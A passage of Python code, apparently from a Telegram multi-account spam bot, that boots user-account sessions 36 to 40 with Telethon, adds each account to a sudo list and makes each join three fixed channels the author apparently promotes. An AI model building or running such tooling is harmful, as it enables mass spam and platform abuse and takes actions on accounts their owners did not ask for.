            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 36 not Found")
        session_name = "rizoelxspam"
        Riz36 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz36.start()
        except Exception as e:
            pass
   
    if STRING37:
        session_name = str(STRING37)
        print("String 37 Found")
        Riz37 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 37")
            await Riz37.start()
            botme = await Riz37.get_me()
            await Riz37(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz37(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz37(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 37 not Found")
        session_name = "rizoelxspam"
        Riz37 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz37.start()
        except Exception as e:
            pass
   
    if STRING38:
        session_name = str(STRING38)
        print("String 38 Found")
        Riz38 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 38")
            await Riz38.start()
            botme = await Riz38.get_me()
            await Riz38(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz38(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz38(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 38 not Found")
        session_name = "rizoelxspam"
        Riz38 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz38.start()
        except Exception as e:
            pass
   
    if STRING39:
        session_name = str(STRING39)
        print("String 39 Found")
        Riz39 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 39")
            await Riz39.start()
            botme = await Riz39.get_me()
            await Riz39(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz39(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz39(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 39 not Found")
        session_name = "rizoelxspam"
        Riz39 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz39.start()
        except Exception as e:
            pass
   
    if STRING40:
        session_name = str(STRING40)
        print("String 40 Found")
        Riz40 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 40")
            await Riz40.start()
            botme = await Riz40.get_me()
            await Riz40(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz40(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz40(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 40 not Found")
        session_name = "rizoelxspam"
        Riz40 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz40.start()
        except Exception as e:
            pass

loop = asyncio.get_event_loop()
loop.run_until_complete(RiZoeLX())
